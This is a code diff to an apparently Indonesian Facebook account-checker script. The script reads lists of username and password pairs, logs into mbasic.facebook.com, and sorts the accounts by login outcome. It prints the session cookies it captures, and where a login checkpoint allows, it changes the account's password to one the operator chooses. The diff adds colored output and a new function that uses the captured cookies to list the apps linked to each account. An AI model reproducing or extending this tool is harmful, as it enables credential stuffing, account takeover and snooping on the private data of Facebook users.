@@ -1,16 +1,28 @@
-import requests as req,re
-from bs4 import BeautifulSoup as par
+#!/usr/bin/python3
+#coding=utf-8
 
 """
+
 Copyright © 2021 - 2023 | Latip176
 Semua codingan dibuat oleh Latip176.
 
 """
 
+import requests as req,re
+from bs4 import BeautifulSoup as par
+
 #data - data
 data,data2={},{}
 aman,cp,salah=0,0,0
 ubahP,pwBaru=[],[]
+
+P = "\x1b[0;97m" 
+M = "\x1b[0;91m"
+H = "\x1b[0;92m"
+K = "\x1b[0;93m"
+B = "\x1b[0;94m"
+
+BM = "\x1b[0;96m"
 
 class Main(object):
 	
@@ -24,10 +36,8 @@ class Main(object):
 		elif(cek=="satu"):
 			file = [file]
 			self.satu(file)
-		else:
-			exit("Error")
 	def file(self,file):
-		print("[✓] Jumlah akun:",len(file),f"\n{'='*45}\n")
+		print("[✓] Jumlah akun:",len(file),f"\n{BM}{'='*45}{P}\n")
 		for data in file:
 			data = data.replace("\n","")
 			user,pw = data.split("|")
@@ -75,8 +85,10 @@ class Eksekusi(Main):
 				aman+=1
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
 				if self.satua==True:
-					print(f"\r[OK] Akun aman			\n[=] {user} | {pw}					\n\n",end="")
-				print(f"\r[√] Akun Aman\n[=] Cookie: {coki}				\n\n",end="")
+					print(f"\r{H}[OK] {self.user}|{self.pw}|{coki}{P}        ",end="")
+				print(f"\r{H}[√] Akun Aman{P}\n[{K}={P}] Cookie: {BM}{coki}{P}                   \n\n",end="")
+				print("[{BM}+{P}] Apk yang terkait:")
+				self.cek_apk(session,coki)
 		elif "checkpoint" in session.cookies.get_dict():
 			cp+=1
 			title=re.findall("\<title>(.*?)<\/title>",str(response))
@@ -91,39 +103,45 @@ class Eksekusi(Main):
 			cek=[cek for cek in response2.find_all("option")]
 			if self.satua==True:
 				print(f"\r\33[1;33m[CP] {self.user} | {self.pw}								\33[37;1m\n",end="")
-			print(f"\r[!] Terdapat {len(cek)} opsi:\n",end="")
+			print(f"\r[{BM}!{P}] Terdapat {BM}{len(cek)}{P} opsi:\n",end="")
 			if(len(cek)==0):
 				if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
 					coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
 					if "y" in ubahP:
 						self.ubah_pw(session,response,link2)
 					else:
-						print(f"\r[√] Akun tap yes\n[=] Cookie: {coki}									\n")
+						print(f"\r[{H}√{P}] {H}Akun tap yes{P}\n[=] Cookie: {BM}{coki}{P}\n")
+						print(f"[{BM}+{P}] {K}Apk yang terkait:{P}")
+						self.cek_apk(session,coki)
 				elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
-					print("\r[×] Akun a2f on							\n")
+					print(f"\r[{M}×{P}] {M}Akun a2f on            {P}\n")
 				else:
-					print("Kesalahan!")
+					print(f"{M}[!]Kesalahan!{P}")
 			elif(len(cek)<=1):
 				for x in range(len(cek)):
 					number+=1
 					opsi=re.findall('\<option selected=\".*?\" value=\".*?\">(.*?)<\/option>',str(cek))
-					print(f"\r[{number}]. {''.join(opsi)}							\n\n",end="")
+					print(f"\r[{number}]. {B}{''.join(opsi)}{P}\n",end="")
+				print("")
 			elif(len(cek)>=2):
 				for x in range(len(cek)):
 					number+=1
 					opsi=re.findall('\<option value=\".+\">(.+)<\/option>',str(cek[x]))
-					print(f"\r[{number}]. {''.join(opsi)}							\n",end="")
+					print(f"\r[{number}]. {B}{''.join(opsi)}{P}\n",end="")
 				print("")
 			else:
 				if "c_user" in session.cookies.get_dict():
 					cp-=1
 					aman+=1
 					coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-					print(f"\r[√] Akun Aman\n[=] Cookie: {coki}				\n",end="")
+					if self.satua==True:
+						print(f"\r{H}[OK] {self.user}|{self.pw}|{coki}{P}        ",end="")
+					print(f"[{BM}+{P}] Apk yang terkait:")
+					self.cek_apk(session,coki)
 					
 		else:
 			salah+=1
-			print("\r[!] Kata sandi salah atau sudah diubah				\n")
+			print(f"\r{M}[!] Kata sandi salah atau sudah diubah          {P}\n")
 	def ubah_pw(self,session,response,link2):
 		dat,dat2={},{}
 		but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
@@ -141,4 +159,37 @@ class Eksekusi(Main):
 			dat2.update({"password_new":"".join(pwBaru)})
 			an=session.post(self.url+link3.get("action"),data=dat2)
 			coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-			print(f"\r[√] Akun tap yes\n[=] Password diubah!\n[=] {self.user} | {''.join(pwBaru)}\n[=] Cookie: {coki}							\n\n",end="")
+			print(f"\r[√] Akun tap yes -> password diubah!\n{H}[=] {self.user}|{''.join(pwBaru)}|{coki}{P}\n    ",end="")
+			self.cek_apk(session,coki)
+	def cek_apk(self,session,coki):
+		hit1, hit2 = 0,0
+		cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+		cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+		if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
+			print(f"{P}[+] Apk yang terkait:")
+			if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
+				print(f"    • {BM}Apk aktif:{P}")
+				print("    [!] Ops! Tidak ada aplikasi aktif yang terkait di akun.")
+			else:
+				print(f"    • {BM}Apk aktif:{P}")
+				apkAktif = re.findall('\<span\ class\=\"ca\ cb\"\>(.*?)<\/span\>',str(cek))
+				ditambahkan = re.findall('\<div\ class\=\"cc\ cd\ ce\"\>(.*?)<\/div\>',str(cek))
+				for muncul in apkAktif:
+					hit1+=1
+					print(f"    [{BM}{hit1}{P}]. {H}{muncul} -> {ditambahkan[hit2]}{P}")
+					hit2+=1
+			if "Anda tidak memiliki aplikasi atau situs web kadaluarsa untuk ditinjau." in cek2:
+				print("    • {BM}Apk kadaluarsa:{P}")
+				print("    [!] Ops! Tidak ada aplikasi kadaluarsa yang terkait diakun.")
+			else:
+				hit1,hit2=0,0
+				print(f"{P}[+] Apk kadaluarsa:")
+				apkKadaluarsa = re.findall('\<span\ class\=\"ca\ cb\"\>(.*?)<\/span\>',str(cek2))
+				kadaluarsa = re.findall('\<div\ class\=\"cc\ cd\ ce\"\>(.*?)<\/div\>',str(cek2))
+				for muncul in apkKadaluarsa:
+					hit1+=1
+					print(f"    [{BM}{hit1}{P}]. {K}{muncul} -> {kadaluarsa[hit2]}{P}")
+					hit2+=1
+		else:
+			print(f"[{BM}×{P}] {M}Cookies Invalid{P}")
+		print("")
